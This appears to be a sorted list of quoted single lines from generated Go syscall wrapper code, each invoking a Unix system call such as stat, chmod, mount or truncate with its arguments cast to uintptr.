"_, _, e1 := RawSyscall(SYS_UNAME, uintptr(unsafe.Pointer(buf)), 0, 0)"
"_, _, e1 := RawSyscall6(SYS_EPOLL_CTL, uintptr(epfd), uintptr(op), uintptr(fd), uintptr(unsafe.Pointer(event)), 0, 0)"
"_, _, e1 := RawSyscall6(SYS_PRLIMIT64, uintptr(pid), uintptr(resource), uintptr(unsafe.Pointer(newlimit)), uintptr(unsafe.Pointer(old)), 0, 0)"
"_, _, e1 := RawSyscall6(SYS_SOCKETPAIR, uintptr(domain), uintptr(typ), uintptr(flags), uintptr(unsafe.Pointer(fd)), 0, 0)"
"_, _, e1 := RawSyscall6(SYS_SOCKETPAIR, uintptr(domain), uintptr(typ), uintptr(proto), uintptr(unsafe.Pointer(fd)), 0, 0)"
"_, _, e1 := RawSyscall6(SYS_TIMERFD_SETTIME, uintptr(fd), uintptr(flags), uintptr(unsafe.Pointer(newValue)), uintptr(unsafe.Pointer(oldValue)), 0, 0)"
"_, _, e1 := Syscall(SYS_ACCESS, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := Syscall(SYS_ACCT, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall(SYS_ADJTIME, uintptr(unsafe.Pointer(delta)), uintptr(unsafe.Pointer(olddelta)), 0)"
"_, _, e1 := Syscall(SYS_BIND, uintptr(s), uintptr(addr), uintptr(addrlen))"
"_, _, e1 := Syscall(SYS_CAP_ENTER, 0, 0, 0)"
"_, _, e1 := Syscall(SYS_CAP_RIGHTS_LIMIT, uintptr(fd), uintptr(unsafe.Pointer(rightsp)), 0)"
"_, _, e1 := Syscall(SYS_CHDIR, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall(SYS_CHFLAGS, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"_, _, e1 := Syscall(SYS_CHMOD, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := Syscall(SYS_CHOWN, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid))"
"_, _, e1 := Syscall(SYS_CHROOT, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall(SYS_CLOCK_GETRES, uintptr(clockid), uintptr(unsafe.Pointer(res)), 0)"
"_, _, e1 := Syscall(SYS_CLOCK_GETTIME, uintptr(clockid), uintptr(unsafe.Pointer(time)), 0)"
"_, _, e1 := Syscall(SYS_CLOSE, uintptr(fd), 0, 0)"
"_, _, e1 := Syscall(SYS_CLOSE_RANGE, uintptr(first), uintptr(last), uintptr(flags))"
"_, _, e1 := Syscall(SYS_CONNECT, uintptr(s), uintptr(addr), uintptr(addrlen))"
"_, _, e1 := Syscall(SYS_DELETE_MODULE, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"_, _, e1 := Syscall(SYS_DUP2, uintptr(from), uintptr(to), 0)"
"_, _, e1 := Syscall(SYS_DUP3, uintptr(from), uintptr(to), uintptr(flags))"
"_, _, e1 := Syscall(SYS_DUP3, uintptr(oldfd), uintptr(newfd), uintptr(flags))"
"_, _, e1 := Syscall(SYS_EXIT, uintptr(code), 0, 0)"
"_, _, e1 := Syscall(SYS_EXTATTR_DELETE_FD, uintptr(fd), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p0)))"
"_, _, e1 := Syscall(SYS_EXTATTR_DELETE_FILE, uintptr(unsafe.Pointer(_p0)), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p1)))"
"_, _, e1 := Syscall(SYS_EXTATTR_DELETE_LINK, uintptr(unsafe.Pointer(_p0)), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p1)))"
"_, _, e1 := Syscall(SYS_FACCESSAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode))"
"_, _, e1 := Syscall(SYS_FCHDIR, uintptr(fd), 0, 0)"
"_, _, e1 := Syscall(SYS_FCHFLAGS, uintptr(fd), uintptr(flags), 0)"
"_, _, e1 := Syscall(SYS_FCHMOD, uintptr(fd), uintptr(mode), 0)"
"_, _, e1 := Syscall(SYS_FCHMODAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode))"
"_, _, e1 := Syscall(SYS_FCHOWN, uintptr(fd), uintptr(uid), uintptr(gid))"
"_, _, e1 := Syscall(SYS_FCHOWN32, uintptr(fd), uintptr(uid), uintptr(gid))"
"_, _, e1 := Syscall(SYS_FDATASYNC, uintptr(fd), 0, 0)"
"_, _, e1 := Syscall(SYS_FINIT_MODULE, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(flags))"
"_, _, e1 := Syscall(SYS_FLOCK, uintptr(fd), uintptr(how), 0)"
"_, _, e1 := Syscall(SYS_FREMOVEXATTR, uintptr(fd), uintptr(unsafe.Pointer(_p0)), 0)"
"_, _, e1 := Syscall(SYS_FSTAT, uintptr(fd), uintptr(unsafe.Pointer(st)), 0)"
"_, _, e1 := Syscall(SYS_FSTAT, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_FSTAT64, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_FSTATFS, uintptr(fd), uintptr(unsafe.Pointer(buf)), 0)"
"_, _, e1 := Syscall(SYS_FSTATFS, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_FSTATFS_FREEBSD12, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_FSTATVFS1, uintptr(fd), uintptr(unsafe.Pointer(buf)), uintptr(flags))"
"_, _, e1 := Syscall(SYS_FSTAT_FREEBSD12, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_FSYNC, uintptr(fd), 0, 0)"
"_, _, e1 := Syscall(SYS_FTRUNCATE, uintptr(fd), 0, uintptr(length))"
"_, _, e1 := Syscall(SYS_FTRUNCATE, uintptr(fd), uintptr(length), 0)"
"_, _, e1 := Syscall(SYS_FTRUNCATE, uintptr(fd), uintptr(length), uintptr(length>>32))"
"_, _, e1 := Syscall(SYS_FTRUNCATE64, uintptr(fd), uintptr(length), uintptr(length>>32))"
"_, _, e1 := Syscall(SYS_FTRUNCATE64, uintptr(fd), uintptr(length>>32), uintptr(length))"
"_, _, e1 := Syscall(SYS_FUTIMES, uintptr(fd), uintptr(unsafe.Pointer(timeval)), 0)"
"_, _, e1 := Syscall(SYS_FUTIMESAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(times)))"
"_, _, e1 := Syscall(SYS_GETITIMER, uintptr(which), uintptr(unsafe.Pointer(currValue)), 0)"
"_, _, e1 := Syscall(SYS_INIT_MODULE, uintptr(_p0), uintptr(len(moduleImage)), uintptr(unsafe.Pointer(_p1)))"
"_, _, e1 := Syscall(SYS_IOCTL, uintptr(fd), uintptr(req), uintptr(arg))"
"_, _, e1 := Syscall(SYS_IOPERM, uintptr(from), uintptr(num), uintptr(on))"
"_, _, e1 := Syscall(SYS_IOPL, uintptr(level), 0, 0)"
"_, _, e1 := Syscall(SYS_KEYCTL, uintptr(cmd), uintptr(arg2), 0)"
"_, _, e1 := Syscall(SYS_KILL, uintptr(pid), uintptr(signum), 0)"
"_, _, e1 := Syscall(SYS_LCHOWN, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid))"
"_, _, e1 := Syscall(SYS_LCHOWN32, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid))"
"_, _, e1 := Syscall(SYS_LINK, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := Syscall(SYS_LISTEN, uintptr(s), uintptr(backlog), 0)"
"_, _, e1 := Syscall(SYS_LISTEN, uintptr(s), uintptr(n), 0)"
"_, _, e1 := Syscall(SYS_LREMOVEXATTR, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := Syscall(SYS_LSTAT, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(st)), 0)"
"_, _, e1 := Syscall(SYS_LSTAT, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_LSTAT64, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_MADVISE, uintptr(_p0), uintptr(len(b)), uintptr(advice))"
"_, _, e1 := Syscall(SYS_MADVISE, uintptr(_p0), uintptr(len(b)), uintptr(behav))"
"_, _, e1 := Syscall(SYS_MKDIR, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := Syscall(SYS_MKDIRAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode))"
"_, _, e1 := Syscall(SYS_MKFIFO, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := Syscall(SYS_MKFIFOAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode))"
"_, _, e1 := Syscall(SYS_MKNOD, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev))"
"_, _, e1 := Syscall(SYS_MLOCK, uintptr(_p0), uintptr(len(b)), 0)"
"_, _, e1 := Syscall(SYS_MLOCKALL, uintptr(flags), 0, 0)"
"_, _, e1 := Syscall(SYS_MPROTECT, uintptr(_p0), uintptr(len(b)), uintptr(prot))"
"_, _, e1 := Syscall(SYS_MSYNC, uintptr(_p0), uintptr(len(b)), uintptr(flags))"
"_, _, e1 := Syscall(SYS_MUNLOCK, uintptr(_p0), uintptr(len(b)), 0)"
"_, _, e1 := Syscall(SYS_MUNLOCKALL, 0, 0, 0)"
"_, _, e1 := Syscall(SYS_MUNMAP, uintptr(addr), uintptr(length), 0)"
"_, _, e1 := Syscall(SYS_NANOSLEEP, uintptr(unsafe.Pointer(time)), uintptr(unsafe.Pointer(leftover)), 0)"
"_, _, e1 := Syscall(SYS_PAUSE, 0, 0, 0)"
"_, _, e1 := Syscall(SYS_PIVOT_ROOT, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := Syscall(SYS_REMOVEXATTR, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := Syscall(SYS_RENAME, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := Syscall(SYS_REVOKE, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall(SYS_RMDIR, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall(SYS_SETDOMAINNAME, uintptr(_p0), uintptr(len(p)), 0)"
"_, _, e1 := Syscall(SYS_SETHOSTNAME, uintptr(_p0), uintptr(len(p)), 0)"
"_, _, e1 := Syscall(SYS_SETITIMER, uintptr(which), uintptr(unsafe.Pointer(newValue)), uintptr(unsafe.Pointer(oldValue)))"
"_, _, e1 := Syscall(SYS_SETLOGIN, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall(SYS_SETNS, uintptr(fd), uintptr(nstype), 0)"
"_, _, e1 := Syscall(SYS_SETPRIORITY, uintptr(which), uintptr(who), uintptr(prio))"
"_, _, e1 := Syscall(SYS_SHMDT, uintptr(addr), 0, 0)"
"_, _, e1 := Syscall(SYS_SHUTDOWN, uintptr(fd), uintptr(how), 0)"
"_, _, e1 := Syscall(SYS_SHUTDOWN, uintptr(s), uintptr(how), 0)"
"_, _, e1 := Syscall(SYS_STAT, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(st)), 0)"
"_, _, e1 := Syscall(SYS_STAT, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_STAT64, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_STATFS, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(buf)), 0)"
"_, _, e1 := Syscall(SYS_STATFS, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_STATFS_FREEBSD12, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall(SYS_STATVFS1, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(buf)), uintptr(flags))"
"_, _, e1 := Syscall(SYS_SYMLINK, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := Syscall(SYS_SYMLINKAT, uintptr(unsafe.Pointer(_p0)), uintptr(newdirfd), uintptr(unsafe.Pointer(_p1)))"
"_, _, e1 := Syscall(SYS_SYNC, 0, 0, 0)"
"_, _, e1 := Syscall(SYS_SYNCFS, uintptr(fd), 0, 0)"
"_, _, e1 := Syscall(SYS_TRUNCATE, uintptr(unsafe.Pointer(_p0)), 0, uintptr(length))"
"_, _, e1 := Syscall(SYS_TRUNCATE, uintptr(unsafe.Pointer(_p0)), uintptr(length), 0)"
"_, _, e1 := Syscall(SYS_TRUNCATE, uintptr(unsafe.Pointer(_p0)), uintptr(length), uintptr(length>>32))"
"_, _, e1 := Syscall(SYS_TRUNCATE64, uintptr(unsafe.Pointer(_p0)), uintptr(length), uintptr(length>>32))"
"_, _, e1 := Syscall(SYS_TRUNCATE64, uintptr(unsafe.Pointer(_p0)), uintptr(length>>32), uintptr(length))"
"_, _, e1 := Syscall(SYS_UMOUNT2, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"_, _, e1 := Syscall(SYS_UNDELETE, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall(SYS_UNLINK, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall(SYS_UNLINKAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags))"
"_, _, e1 := Syscall(SYS_UNMOUNT, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"_, _, e1 := Syscall(SYS_UNSHARE, uintptr(flags), 0, 0)"
"_, _, e1 := Syscall(SYS_USTAT, uintptr(dev), uintptr(unsafe.Pointer(ubuf)), 0)"
"_, _, e1 := Syscall(SYS_UTIME, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(buf)), 0)"
"_, _, e1 := Syscall(SYS_UTIMES, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(times)), 0)"
"_, _, e1 := Syscall(SYS_UTIMES, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(timeval)), 0)"
"_, _, e1 := Syscall(SYS___CAP_RIGHTS_GET, uintptr(version), uintptr(fd), uintptr(unsafe.Pointer(rightsp)))"
"_, _, e1 := Syscall6(SYS_ARM_FADVISE64_64, uintptr(fd), uintptr(advice), uintptr(offset), uintptr(offset>>32), uintptr(length), uintptr(length>>32))"
"_, _, e1 := Syscall6(SYS_ARM_SYNC_FILE_RANGE, uintptr(fd), uintptr(flags), uintptr(off), uintptr(off>>32), uintptr(n), uintptr(n>>32))"
"_, _, e1 := Syscall6(SYS_CLOCK_NANOSLEEP, uintptr(clockid), uintptr(flags), uintptr(unsafe.Pointer(request)), uintptr(unsafe.Pointer(remain)), 0, 0)"
"_, _, e1 := Syscall6(SYS_FACCESSAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_FACCESSAT2, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_FADVISE64, uintptr(fd), uintptr(offset), uintptr(length), uintptr(advice), 0, 0)"
"_, _, e1 := Syscall6(SYS_FADVISE64_64, uintptr(fd), uintptr(advice), uintptr(offset>>32), uintptr(offset), uintptr(length>>32), uintptr(length))"
"_, _, e1 := Syscall6(SYS_FADVISE64_64, uintptr(fd), uintptr(offset), uintptr(offset>>32), uintptr(length), uintptr(length>>32), uintptr(advice))"
"_, _, e1 := Syscall6(SYS_FALLOCATE, uintptr(fd), uintptr(mode), uintptr(off), uintptr(len), 0, 0)"
"_, _, e1 := Syscall6(SYS_FALLOCATE, uintptr(fd), uintptr(mode), uintptr(off), uintptr(off>>32), uintptr(len), uintptr(len>>32))"
"_, _, e1 := Syscall6(SYS_FALLOCATE, uintptr(fd), uintptr(mode), uintptr(off>>32), uintptr(off), uintptr(len>>32), uintptr(len))"
"_, _, e1 := Syscall6(SYS_FANOTIFY_MARK, uintptr(fd), uintptr(flags), uintptr(mask), uintptr(dirFd), uintptr(unsafe.Pointer(pathname)), 0)"
"_, _, e1 := Syscall6(SYS_FANOTIFY_MARK, uintptr(fd), uintptr(flags), uintptr(mask), uintptr(mask>>32), uintptr(dirFd), uintptr(unsafe.Pointer(pathname)))"
"_, _, e1 := Syscall6(SYS_FANOTIFY_MARK, uintptr(fd), uintptr(flags), uintptr(mask>>32), uintptr(mask), uintptr(dirFd), uintptr(unsafe.Pointer(pathname)))"
"_, _, e1 := Syscall6(SYS_FCHMODAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_FCHOWNAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_FSETXATTR, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(dest)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_FSTATAT, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_FSTATAT64, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_FSTATAT_FREEBSD12, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_FTRUNCATE, uintptr(fd), 0, uintptr(length), uintptr(length>>32), 0, 0)"
"_, _, e1 := Syscall6(SYS_FTRUNCATE64, uintptr(fd), 0, uintptr(length), uintptr(length>>32), 0, 0)"
"_, _, e1 := Syscall6(SYS_FTRUNCATE64, uintptr(fd), 0, uintptr(length>>32), uintptr(length), 0, 0)"
"_, _, e1 := Syscall6(SYS_GETSOCKOPT, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(unsafe.Pointer(vallen)), 0)"
"_, _, e1 := Syscall6(SYS_KEXEC_FILE_LOAD, uintptr(kernelFd), uintptr(initrdFd), uintptr(cmdlineLen), uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_KEYCTL, uintptr(cmd), uintptr(arg2), uintptr(_p0), uintptr(len(payload)), uintptr(arg5), 0)"
"_, _, e1 := Syscall6(SYS_KEYCTL, uintptr(cmd), uintptr(arg2), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0, 0)"
"_, _, e1 := Syscall6(SYS_LINKAT, uintptr(olddirfd), uintptr(unsafe.Pointer(_p0)), uintptr(newdirfd), uintptr(unsafe.Pointer(_p1)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_LINKAT, uintptr(pathfd), uintptr(unsafe.Pointer(_p0)), uintptr(linkfd), uintptr(unsafe.Pointer(_p1)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_LSETXATTR, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(_p2), uintptr(len(data)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_MKNODAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev), 0, 0)"
"_, _, e1 := Syscall6(SYS_MKNODAT, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev), 0, 0)"
"_, _, e1 := Syscall6(SYS_MKNODAT_FREEBSD12, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev), 0, 0)"
"_, _, e1 := Syscall6(SYS_MKNODAT_FREEBSD12, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev), uintptr(dev>>32), 0)"
"_, _, e1 := Syscall6(SYS_MOUNT, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(unsafe.Pointer(_p2)), uintptr(flags), uintptr(unsafe.Pointer(data)), 0)"
"_, _, e1 := Syscall6(SYS_MOUNT_SETATTR, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags), uintptr(unsafe.Pointer(attr)), uintptr(size), 0)"
"_, _, e1 := Syscall6(SYS_MOVE_MOUNT, uintptr(fromDirfd), uintptr(unsafe.Pointer(_p0)), uintptr(toDirfd), uintptr(unsafe.Pointer(_p1)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_NAME_TO_HANDLE_AT, uintptr(dirFD), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(fh)), uintptr(unsafe.Pointer(mountID)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_NEWFSTATAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(st)), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_NEWFSTATAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_PIDFD_SEND_SIGNAL, uintptr(pidfd), uintptr(sig), uintptr(unsafe.Pointer(info)), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_POSIX_FADVISE, uintptr(fd), 0, uintptr(offset), 0, uintptr(length), uintptr(advice))"
"_, _, e1 := Syscall6(SYS_POSIX_FADVISE, uintptr(fd), uintptr(offset), uintptr(length), uintptr(advice), 0, 0)"
"_, _, e1 := Syscall6(SYS_POSIX_FADVISE, uintptr(fd), uintptr(offset), uintptr(offset>>32), uintptr(length), uintptr(length>>32), uintptr(advice))"
"_, _, e1 := Syscall6(SYS_PRCTL, uintptr(option), uintptr(arg2), uintptr(arg3), uintptr(arg4), uintptr(arg5), 0)"
"_, _, e1 := Syscall6(SYS_PTRACE, uintptr(request), uintptr(pid), uintptr(addr), uintptr(data), 0, 0)"
"_, _, e1 := Syscall6(SYS_REBOOT, uintptr(magic1), uintptr(magic2), uintptr(cmd), uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := Syscall6(SYS_RENAMEAT, uintptr(fromfd), uintptr(unsafe.Pointer(_p0)), uintptr(tofd), uintptr(unsafe.Pointer(_p1)), 0, 0)"
"_, _, e1 := Syscall6(SYS_RENAMEAT, uintptr(olddirfd), uintptr(unsafe.Pointer(_p0)), uintptr(newdirfd), uintptr(unsafe.Pointer(_p1)), 0, 0)"
"_, _, e1 := Syscall6(SYS_RENAMEAT2, uintptr(olddirfd), uintptr(unsafe.Pointer(_p0)), uintptr(newdirfd), uintptr(unsafe.Pointer(_p1)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_SENDTO, uintptr(s), uintptr(_p0), uintptr(len(buf)), uintptr(flags), uintptr(to), uintptr(addrlen))"
"_, _, e1 := Syscall6(SYS_SETSOCKOPT, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(vallen), 0)"
"_, _, e1 := Syscall6(SYS_SETXATTR, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(_p2), uintptr(len(data)), uintptr(flags), 0)"
"_, _, e1 := Syscall6(SYS_STATX, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags), uintptr(mask), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := Syscall6(SYS_SYNC_FILE_RANGE, uintptr(fd), uintptr(off), uintptr(n), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_SYNC_FILE_RANGE, uintptr(fd), uintptr(off), uintptr(off>>32), uintptr(n), uintptr(n>>32), uintptr(flags))"
"_, _, e1 := Syscall6(SYS_SYNC_FILE_RANGE2, uintptr(fd), uintptr(flags), uintptr(off), uintptr(n), 0, 0)"
"_, _, e1 := Syscall6(SYS_SYNC_FILE_RANGE2, uintptr(fd), uintptr(flags), uintptr(off>>32), uintptr(off), uintptr(n>>32), uintptr(n))"
"_, _, e1 := Syscall6(SYS_TRUNCATE, uintptr(unsafe.Pointer(_p0)), 0, uintptr(length), uintptr(length>>32), 0, 0)"
"_, _, e1 := Syscall6(SYS_TRUNCATE64, uintptr(unsafe.Pointer(_p0)), 0, uintptr(length), uintptr(length>>32), 0, 0)"
"_, _, e1 := Syscall6(SYS_TRUNCATE64, uintptr(unsafe.Pointer(_p0)), 0, uintptr(length>>32), uintptr(length), 0, 0)"
"_, _, e1 := Syscall6(SYS_UTIMENSAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(times)), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall6(SYS_WAITID, uintptr(idType), uintptr(id), uintptr(unsafe.Pointer(info)), uintptr(options), uintptr(unsafe.Pointer(rusage)), 0)"
"_, _, e1 := Syscall6(SYS___SYSCTL, uintptr(_p0), uintptr(len(mib)), uintptr(unsafe.Pointer(old)), uintptr(unsafe.Pointer(oldlen)), uintptr(unsafe.Pointer(new)), uintptr(newlen))"
"_, _, e1 := Syscall9(SYS_FADVISE64, uintptr(fd), 0, uintptr(offset), uintptr(offset>>32), uintptr(length), uintptr(length>>32), uintptr(advice), 0, 0)"
"_, _, e1 := Syscall9(SYS_FADVISE64, uintptr(fd), 0, uintptr(offset>>32), uintptr(offset), uintptr(length>>32), uintptr(length), uintptr(advice), 0, 0)"
"_, _, e1 := Syscall9(SYS_POSIX_FADVISE, uintptr(fd), 0, uintptr(offset), uintptr(offset>>32), 0, uintptr(length), uintptr(length>>32), uintptr(advice), 0)"
"_, _, e1 := Syscall9(SYS_POSIX_FADVISE, uintptr(fd), 0, uintptr(offset), uintptr(offset>>32), uintptr(length), uintptr(length>>32), uintptr(advice), 0, 0)"
"_, _, e1 := Syscall9(SYS_SENDFILE, uintptr(infd), uintptr(outfd), uintptr("
"_, _, e1 := Syscall9(SYS_SYNC_FILE_RANGE, uintptr(fd), 0, uintptr(off), uintptr(off>>32), uintptr(n), uintptr(n>>32), uintptr(flags), 0, 0)"
"_, _, e1 := Syscall9(SYS_SYNC_FILE_RANGE, uintptr(fd), 0, uintptr(off>>32), uintptr(off), uintptr(n>>32), uintptr(n), uintptr(flags), 0, 0)"
"_, _, e1 := rawSysvicall6(uintptr(unsafe.Pointer("
"_, _, e1 := syscall_rawSyscall(libc_getpeername_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"_, _, e1 := syscall_rawSyscall(libc_getrlimit_trampoline_addr, uintptr(which), uintptr(unsafe.Pointer(lim)), 0)"
"_, _, e1 := syscall_rawSyscall(libc_getrusage_trampoline_addr, uintptr(who), uintptr(unsafe.Pointer(rusage)), 0)"
"_, _, e1 := syscall_rawSyscall(libc_getsockname_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"_, _, e1 := syscall_rawSyscall(libc_gettimeofday_trampoline_addr, uintptr(unsafe.Pointer(tp)), 0, 0)"
"_, _, e1 := syscall_rawSyscall(libc_pipe_trampoline_addr, uintptr(unsafe.Pointer(p)), 0, 0)"
"_, _, e1 := syscall_rawSyscall(libc_seteuid_trampoline_addr, uintptr(euid), 0, 0)"
"_, _, e1 := syscall_rawSyscall(libc_setgid_trampoline_addr, uintptr(gid), 0, 0)"
"_, _, e1 := syscall_rawSyscall(libc_setgroups_trampoline_addr, uintptr(ngid), uintptr(unsafe.Pointer(gid)), 0)"
"_, _, e1 := syscall_rawSyscall(libc_setpgid_trampoline_addr, uintptr(pid), uintptr(pgid), 0)"
"_, _, e1 := syscall_rawSyscall(libc_setregid_trampoline_addr, uintptr(rgid), uintptr(egid), 0)"
"_, _, e1 := syscall_rawSyscall(libc_setreuid_trampoline_addr, uintptr(ruid), uintptr(euid), 0)"
"_, _, e1 := syscall_rawSyscall(libc_setrlimit_trampoline_addr, uintptr(which), uintptr(unsafe.Pointer(lim)), 0)"
"_, _, e1 := syscall_rawSyscall(libc_settimeofday_trampoline_addr, uintptr(unsafe.Pointer(tp)), 0, 0)"
"_, _, e1 := syscall_rawSyscall(libc_setuid_trampoline_addr, uintptr(uid), 0, 0)"
"_, _, e1 := syscall_rawSyscall6(libc_socketpair_trampoline_addr, uintptr(domain), uintptr(typ), uintptr(proto), uintptr(unsafe.Pointer(fd)), 0, 0)"
"_, _, e1 := syscall_rawsyscall(SYS_GETRLIMIT, uintptr(resource), uintptr(unsafe.Pointer(rlim)), 0)"
"_, _, e1 := syscall_rawsyscall(SYS_GETRUSAGE, uintptr(who), uintptr(unsafe.Pointer(rusage)), 0)"
"_, _, e1 := syscall_rawsyscall(SYS_GETTIMEOFDAY, uintptr(unsafe.Pointer(tv)), 0, 0)"
